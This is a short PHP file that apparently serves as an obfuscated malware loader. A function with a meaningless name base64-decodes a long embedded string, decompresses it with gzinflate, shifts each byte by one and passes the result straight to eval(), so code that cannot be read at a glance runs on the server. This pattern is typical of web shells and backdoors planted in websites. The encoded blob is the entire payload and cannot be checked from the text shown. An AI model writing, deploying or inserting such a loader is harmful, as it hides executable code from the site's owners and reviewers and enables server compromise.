<?php function yQQa($xAk)
{
    $xAk = gzinflate(base64_decode($xAk));
    for ($i = 0; $i < strlen($xAk); $i++) {
        $xAk[$i] = chr(ord($xAk[$i]) - 1);
    }
    return $xAk;
}eval(yQQa("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"));